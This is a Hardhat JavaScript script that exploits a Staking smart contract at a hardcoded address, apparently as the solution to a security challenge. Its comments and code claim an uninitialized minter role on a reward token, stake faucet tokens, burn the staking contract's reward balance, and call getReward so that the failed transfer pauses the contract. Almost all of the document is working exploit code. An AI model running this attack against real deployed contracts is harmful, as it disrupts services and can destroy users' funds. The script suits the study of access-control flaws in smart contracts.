const hre = require("hardhat");
const { ethers } = hre;

const address = '0x805F02142680f853A9c0E5D5d6F49AEc28C31E8b';

// The goal here is to pause the Staking contract, which can be achieved by making the transfer
// call in the `getReward` function to fail.
// The RewardToken contract has an uninitialized minted role we can take, this would allow us
// to burn the tokens in the Staking contract, which will make the transfer fail when retrieving
// the rewards, pausing the contract.
// Steps:
// 1. Claim the minter role in the RewardToken contract
// 2. Ask for some StakingTokens using the faucer
// 3. Stake those tokens in the Staking contract
// 4. Burn all RewardTokens present in the Staking contract
// 5. Fetch the staking reward. The contract will try to transfer us the rewards from the staking
//    but since the contract is empty, it will fail and pause the contract.
async function main() {
  const [signer] = await ethers.getSigners();

  const Staking = await ethers.getContractFactory("Staking");
  const staking = Staking.attach(address);

  const StakingToken = await ethers.getContractFactory("StakingToken");
  const stakingToken = StakingToken.attach(await staking.stakingToken());

  const RewardToken = await ethers.getContractFactory("RewardToken");
  const rewardToken = RewardToken.attach(await staking.rewardTokens(0));

  const setMinterTx = await rewardToken.setMinter(signer.address);
  console.log('Setting minter in RWT:', setMinterTx.hash);
  await setMinterTx.wait();

  const faucetTx = await stakingToken.faucet();
  console.log('Claiming faucet:', faucetTx.hash);
  await faucetTx.wait();

  const approveTx = await stakingToken.approve(staking.address, ethers.constants.MaxUint256);
  console.log('Approving stake tokens:', approveTx.hash);
  await approveTx.wait();

  const stakeTx = await staking.stake(await stakingToken.balanceOf(signer.address));
  console.log('Staking tokens:', stakeTx.hash);
  await stakeTx.wait();

  const burnTx = await rewardToken.burnFrom(staking.address, await rewardToken.balanceOf(staking.address));
  console.log('Burning staking RWT tokens:', burnTx.hash);
  await burnTx.wait();

  const getRewardTx = await staking.getReward();
  console.log('Claiming reward tokens:', getRewardTx.hash);
  await getRewardTx.wait();

  console.log('Paused:', await staking.paused());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
